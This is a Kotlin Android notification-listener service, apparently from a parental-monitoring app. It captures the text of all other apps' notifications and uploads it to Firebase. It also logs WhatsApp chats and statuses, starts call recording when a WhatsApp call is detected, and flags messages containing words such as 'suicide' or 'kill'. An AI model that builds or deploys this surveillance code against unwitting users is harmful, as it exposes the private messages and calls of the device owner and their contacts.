package com.example.authapp.service

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.data.NotificationItem
import com.google.firebase.crashlytics.FirebaseCrashlytics

class ChildNotificationListenerService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        try {
            val packageName = sbn.packageName ?: return
            // Ignore self-notifications
            if (packageName == applicationContext.packageName) return

            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

            // Skip empty notifications
            if (title.isEmpty() && text.isEmpty()) return

            val pm = packageManager
            val appName = try {
                val appInfo = pm.getApplicationInfo(packageName, 0)
                pm.getApplicationLabel(appInfo).toString()
            } catch (_: Exception) {
                packageName
            }

            val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
            if (uid.isNotEmpty()) {
                val item = NotificationItem(
                    packageName = packageName,
                    appName = appName,
                    title = title,
                    text = text,
                    timestamp = System.currentTimeMillis()
                )
                FirebaseRepository.pushNotification(uid, item)

                // WhatsApp Chat & Status Automatic Interceptor
                if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" || packageName.contains("whatsapp", ignoreCase = true)) {
                    val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
                    val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
                    val fullContent = "$title $text $subText $bigText".lowercase()

                    val isWhatsAppCall = fullContent.contains("incoming voice call") ||
                            fullContent.contains("incoming video call") ||
                            fullContent.contains("ongoing voice call") ||
                            fullContent.contains("ongoing video call") ||
                            fullContent.contains("call in progress") ||
                            fullContent.contains("whatsapp call")

                    if (isWhatsAppCall) {
                        isWhatsAppCallActive = true
                        val callLog = com.example.authapp.data.CallLogItem(
                            number = "WhatsApp Call",
                            name = title.ifEmpty { "WhatsApp Contact" },
                            type = if (fullContent.contains("incoming")) "INCOMING_WHATSAPP" else "OUTGOING_WHATSAPP",
                            timestamp = System.currentTimeMillis()
                        )
                        FirebaseRepository.logSingleCallLog(uid, callLog)

                        val serviceIntent = android.content.Intent(applicationContext, ChildForegroundService::class.java).apply {
                            action = ChildForegroundService.ACTION_START_CALL_RECORDING
                            putExtra(ChildForegroundService.EXTRA_PHONE_NUMBER, "WhatsApp_${title.replace(" ", "_")}")
                        }
                        try {
                            androidx.core.content.ContextCompat.startForegroundService(applicationContext, serviceIntent)
                        } catch (e: Exception) {
                            FirebaseCrashlytics.getInstance().recordException(e)
                        }
                    }

                    val type = when {
                        isWhatsAppCall -> "AUDIO"
                        fullContent.contains("status") || fullContent.contains("posted a") || fullContent.contains("new update") -> "STATUS"
                        fullContent.contains("voice message") || fullContent.contains("audio message") || fullContent.contains("audio") -> "AUDIO"
                        fullContent.contains("photo") || fullContent.contains("image") || fullContent.contains("picture") -> "PHOTO"
                        fullContent.contains("video") || fullContent.contains("movie") -> "VIDEO"
                        else -> "CHAT"
                    }

                    val messageDisplay = when {
                        isWhatsAppCall -> "WhatsApp Call ($title)"
                        type == "STATUS" && text.isEmpty() -> "New WhatsApp Status Update"
                        text.isNotEmpty() -> text
                        bigText.isNotEmpty() -> bigText
                        else -> "WhatsApp notification update"
                    }

                    val waItem = com.example.authapp.data.WhatsAppLogItem(
                        senderName = title.ifEmpty { "WhatsApp User" },
                        messageText = messageDisplay,
                        timestamp = System.currentTimeMillis(),
                        type = type,
                        isIncoming = true
                    )
                    FirebaseRepository.pushWhatsAppLog(uid, waItem)
                }

                // Keyword Safety Filter (Detects inappropriate/dangerous content in messages)
                val sensitiveKeywords = listOf("threat", "danger", "urgent", "help", "kill", "die", "attack", "drugs", "suicide", "hate")
                val combinedContent = "$title $text".lowercase()
                val matchedKeyword = sensitiveKeywords.firstOrNull { combinedContent.contains(it) }
                if (matchedKeyword != null) {
                    val alert = com.example.authapp.data.SecurityAlert(
                        type = "KEYWORD_DETECTED",
                        title = "Flagged Keyword Alert ⚠️",
                        message = "Safety keyword '$matchedKeyword' detected in message from $appName",
                        timestamp = System.currentTimeMillis(),
                        severity = "CRITICAL"
                    )
                    FirebaseRepository.pushSecurityAlert(uid, alert)
                }
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        if (sbn == null) return
        try {
            val packageName = sbn.packageName ?: return
            if ((packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" || packageName.contains("whatsapp", ignoreCase = true)) && isWhatsAppCallActive) {
                isWhatsAppCallActive = false
                val serviceIntent = android.content.Intent(applicationContext, ChildForegroundService::class.java).apply {
                    action = ChildForegroundService.ACTION_STOP_CALL_RECORDING
                }
                try {
                    androidx.core.content.ContextCompat.startForegroundService(applicationContext, serviceIntent)
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().recordException(e)
                }
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
    }

    companion object {
        private var isWhatsAppCallActive = false
    }
}
